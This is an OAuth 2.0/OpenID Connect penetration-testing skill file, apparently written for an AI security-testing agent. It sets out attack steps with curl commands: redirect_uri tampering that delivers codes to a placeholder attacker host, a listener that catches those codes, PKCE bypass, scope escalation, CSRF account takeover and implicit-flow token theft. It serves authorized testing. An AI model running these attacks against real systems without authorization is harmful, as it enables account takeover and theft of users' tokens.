---
name: oauth-oidc-testing
description: Test OAuth 2.0 / OpenID Connect authorization flows for abuse — discover provider metadata, identify the grant in use, then attack redirect_uri validation, state/CSRF, PKCE enforcement, scope escalation, implicit-flow token leakage, and client/token validation gaps. Use during phase 3 (authentication) of an API engagement whenever the target delegates auth to an OAuth/OIDC provider.
license: Apache-2.0
metadata:
  author: Section9Labs
  version: "1.0.0"
---

# OAuth 2.0 / OIDC Flow Testing

Attack the authorization layer itself: the redirects, codes, tokens, and
validation steps between client, authorization server (AS), and resource
server (RS). JWT *structural* attacks (alg confusion, key injection, claim
forgery) are out of scope here — hand captured tokens to the `jwt-attacks`
skill. Finding/asset/fan-out wiring for rupu lives in `references/rupu.md`.

## 1. Flow mapping — provider discovery

Fetch both well-known documents (OIDC and plain OAuth AS metadata):

```
curl -sk https://login.example.com/.well-known/openid-configuration | python3 -m json.tool
curl -sk https://login.example.com/.well-known/oauth-authorization-server | python3 -m json.tool
```

Also try tenant-scoped paths (`/realms/<realm>/.well-known/openid-configuration`,
`/<tenant>/v2.0/.well-known/openid-configuration`, `/oauth2/.well-known/...`).

Or run the helper, which fetches, summarizes, flags weak signals, and emits
rupu work units:

```
python3 scripts/oidc_discover.py https://login.example.com \
    --units reports/oauth-oidc-units.json
```

Read these keys:

| Key | Why it matters |
|---|---|
| `authorization_endpoint` | Primary attack surface for redirect_uri/state/scope/PKCE tests |
| `token_endpoint` | Code exchange, replay, client-auth, grant tests |
| `jwks_uri` | Feed to `jwt-attacks`; also check for key confusion across tenants |
| `grant_types_supported` | `password` (ROPC), `implicit`, `urn:ietf:params:oauth:grant-type:device_code` each open distinct attacks |
| `response_types_supported` | `token`, `id_token token` ⇒ implicit flow live |
| `code_challenge_methods_supported` | Missing ⇒ PKCE likely unenforced; `plain` ⇒ downgrade target |
| `scopes_supported` | Enumerate privileged scopes (`admin`, `*:write`, `offline_access`) |
| `token_endpoint_auth_methods_supported` | `none` ⇒ public clients, PKCE must carry the weight |
| `registration_endpoint` | Dynamic client registration — try registering a client with an attacker redirect_uri |

Identify the flow actually used by the app: open the login in a browser
through an intercepting proxy (Burp/mitmproxy/ZAP), trigger sign-in, and
capture the first request to `authorization_endpoint`. `response_type=code`
+ `code_challenge` ⇒ code+PKCE; `code` alone ⇒ plain code; `token` /
`id_token token` ⇒ implicit; no browser hop and a direct POST with
`grant_type=client_credentials` or `password` ⇒ machine or ROPC flow;
`device_code` polling ⇒ device flow. Per-flow test matrices:
`references/oauth-flows.md`.

Mark the AS and each discovered endpoint as assets (see `references/rupu.md`).

## 2. redirect_uri manipulation

Goal: get the AS to deliver the authorization code (or token, in implicit)
to a URL you control. Generate the full tamper set:

```
python3 scripts/build_authorize.py \
  --authorize https://login.example.com/oauth2/authorize \
  --client-id webapp --redirect-uri https://app.example.com/callback \
  --scope "openid profile" --attacker https://203.0.113.50 \
  --units reports/oauth-redirect-units.json
```

Variants it builds (each is one browser/proxy test — load the URL in an
*authenticated* session and watch where the 302 lands):

- **Full replacement**: `redirect_uri=https://203.0.113.50/callback`
- **Subdomain**: `https://evil.app.example.com/callback`, `https://app.example.com.203.0.113.50/`
- **Path append / traversal**: `https://app.example.com/callback/../open-redirect`, `/callback%2f..%2fx`, `/callbackextra`
- **@-confusion**: `https://app.example.com@203.0.113.50/callback` (parser treats real host as userinfo)
- **Open redirect chaining**: `redirect_uri=https://app.example.com/redirect?url=https://203.0.113.50/` — exact-match passes, code bounces onward
- **localhost / loopback**: `http://localhost:8000/callback`, `http://127.0.0.1/callback` (often globally whitelisted for dev)
- **Scheme downgrade**: `http://app.example.com/callback`
- **Extra query params / fragment**: `.../callback?x=1`, `.../callback#x` — tests exact-string vs prefix match
- **Double/encoded**: `%252e%252e`, backslash `https://app.example.com\@203.0.113.50`

Reading the result — a **pass (vulnerable)** looks like:

```
HTTP/1.1 302 Found
Location: https://203.0.113.50/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz
```

The code arrives at the attacker host. Complete the exploit by exchanging it:

```
curl -sk -X POST https://login.example.com/oauth2/token \
  -d grant_type=authorization_code -d code=SplxlOBeZQQYbYS6WxSbIA \
  -d redirect_uri=https://203.0.113.50/callback \
  -d client_id=webapp
```

If the token endpoint also skips redirect_uri matching, exchanging with the
*original* redirect_uri works too — note which. A **fail** is an AS error
page (`error=invalid_request` / "redirect_uri mismatch") with no redirect.
Full decision table: `references/attacks.md`.

## 3. state / CSRF

`state` must be unpredictable and verified by the client on callback.

1. **Drop it**: capture a legit authorize URL, remove `&state=...`, complete
   login. If the client accepts the callback without state ⇒ login CSRF.
2. **Replay it**: reuse a previously seen `state` value in a fresh flow. If
   accepted ⇒ state is not bound to the session.
3. **Code injection (CSRF-to-account-link)**: start a flow in *your* session,
   capture *your* code at the callback but do not deliver it; craft
   `https://app.example.com/callback?code=<your-code>&state=<victim-or-none>`
   and have the victim's browser load it. If the app binds your IdP identity
   to the victim's session (or vice versa) ⇒ account takeover via forced login.

Confirm with the HTTP exchange: the callback request without/with stale
state returning `302 /home` + session cookie is the evidence.

## 4. PKCE

1. **Absence on a public client**: if the app's authorize request has no
   `code_challenge` and `token_endpoint_auth_methods_supported` includes
   `none`, an intercepted code is directly exchangeable — demonstrate by
   replaying a captured code from curl with no secret.
2. **Downgrade**: rewrite `code_challenge_method=S256` → `plain` in the
   proxy, keep `code_challenge=<verifier>`. If the token exchange with
   `code_verifier=<same value>` succeeds ⇒ downgrade accepted.
3. **Challenge not enforced**: send authorize *with* `code_challenge`, then
   exchange the code **omitting** `code_verifier`:
   ```
   curl -sk -X POST https://login.example.com/oauth2/token \
     -d grant_type=authorization_code -d code=... \
     -d redirect_uri=https://app.example.com/callback -d client_id=webapp
   ```
   A 200 with tokens ⇒ PKCE theater.
4. **Verifier not checked**: exchange with `code_verifier=AAAA...` (wrong
   value, ≥43 chars). 200 ⇒ verifier ignored.
5. Also try authorize with **no** `code_challenge` for a client that
   normally sends one — if the AS still issues a code exchangeable without
   a verifier, per-client PKCE is optional.

Any success here means authorization-code interception (referrer leak,
redirect_uri bug, malicious app on shared redirect scheme) is fully
exploitable.

## 5. Scope escalation

- **At authorize**: add scopes to the request —
  `scope=openid profile admin api:write offline_access`. Watch the consent
  screen (silent grant of unrequested-by-design scopes?) and decode the
  resulting access token / call the introspection endpoint:
  ```
  curl -sk -X POST https://login.example.com/oauth2/introspect \
    -u webapp:secret -d token=<access_token>
  ```
  Compare `scope` in the response against what the client is registered for.
- **At token exchange**: send `scope=...` in the token POST that *exceeds*
  the authorize-time grant; also test refresh-token refresh with widened
  `scope`.
- **Cross-client mix-up**: take a token issued to client A (low-priv SPA)
  and call APIs belonging to client B's audience. If the RS checks only
  signature/issuer, not `aud`/`azp`/scope ⇒ confused deputy.
- **Downscope-then-upscope**: some AS honor scope on refresh — refresh a
  narrow token asking for broad scope.

Confirmation = an API call that succeeds with the escalated scope
(`GET /v1/admin/users` returning 200 with a token that should be
`profile`-only).

## 6. Implicit flow token leakage

If `response_types_supported` includes `token` / `id_token token`:

1. Craft `response_type=token` on the authorize endpoint (even if the app
   itself uses code — the AS may still honor it for the same client_id):
   `.../authorize?response_type=token&client_id=webapp&redirect_uri=...&scope=openid&state=x&nonce=x`
2. Success ⇒ `Location: https://app.example.com/callback#access_token=eyJ...&token_type=Bearer`.
   The token now sits in browser history, proxy logs, and any `Referer`
   leaving the callback page — demonstrate with a page on the callback host
   that loads an external image and show the `Referer` header.
3. **Token substitution**: in implicit, swap the `access_token` fragment for
   a token issued to a *different* user/client before the SPA consumes it.
   If the SPA logs you in as that user without validating `id_token`
   `nonce`/`at_hash` ⇒ token substitution / audience confusion.
4. Combine with any redirect_uri weakness from §2 — implicit + lax redirect
   is immediate token theft, no code exchange needed.

## 7. Client credentials & token-handling issues

- **Secret in a public client**: grep SPA bundles / mobile APKs for
  `client_secret`; verify it is live:
  `curl -sk -X POST .../token -d grant_type=client_credentials -d client_id=webapp -d client_secret=<found>`
  — 200 + token ⇒ anyone impersonates the client.
- **`none` client auth** on a confidential grant: token requests with only
  `client_id` succeeding where a secret is expected.
- **Code replay**: exchange the same authorization code twice. Second 200 ⇒
  no single-use enforcement; also check that replay does NOT revoke the
  first token (per spec it should).
- **Refresh-token rotation absence**: use a refresh token, then use the
  *old* one again. Both working ⇒ stolen refresh tokens live forever.
- **ROPC enabled**: `grant_type=password` with `username`/`password` is a
  credential-stuffing oracle with no MFA — demonstrate one valid login.
- **Resource-server validation**: craft calls to the API with a token whose
  `aud`/`iss`/`azp` point elsewhere (another tenant of the same IdP, another
  client). Acceptance ⇒ IdP mix-up / confused deputy. For forging or
  mutating the JWT itself, hand off to `jwt-attacks` with the token and
  `jwks_uri`.

Per-attack precondition/steps/confirm/remediation: `references/attacks.md`.

## 8. Tooling notes

- **curl**: `-sk` (quiet, ignore TLS), `-i` to see the `Location` header,
  `-b 'session=...'` to ride an authenticated session, `--data-urlencode`
  for scopes with spaces. Never follow redirects (`-L`) when the Location
  header IS the result.
- **httpie**: `http -f POST login.example.com/oauth2/token grant_type=... --verify=no`.
- **Browser + proxy**: authorize-endpoint tests need a real cookie session;
  paste `build_authorize.py` URLs into the authenticated browser, read the
  302 in the proxy. Match & Replace rules automate PKCE downgrade and state
  stripping.
- Catch exfiltrated codes with `python3 -m http.server 80` on
  203.0.113.50 and read the access log line:
  `192.0.2.10 - - "GET /callback?code=Splx...&state=xyz HTTP/1.1" 404`.

## 9. Output & handoff (rupu)

Every parse step ends in ingestible data — see `references/rupu.md`:

- `oidc_discover.py --units` / `build_authorize.py --units` write a JSON
  array of work units atomically under `reports/` for `for_each` fan-out or
  per-child `dispatch`. For splitting OpenAPI/Swagger input per resource,
  use the reporting pack's `work-units` skill (`split.py openapi`) — do not
  reimplement it.
- Record the AS and each endpoint with `assets.mark` (`api:service`,
  `api:endpoint`; `mapped` → `tested` → `exploited`) — wiring per the
  `coverage-assets` skill.
- A stolen code/token, accepted tampered redirect, PKCE bypass, or scope
  escalation that works is a **confirmed finding**: `findings.report` with
  the http_exchange evidence, per the `finding-report` skill; mark the
  endpoint `exploited`.
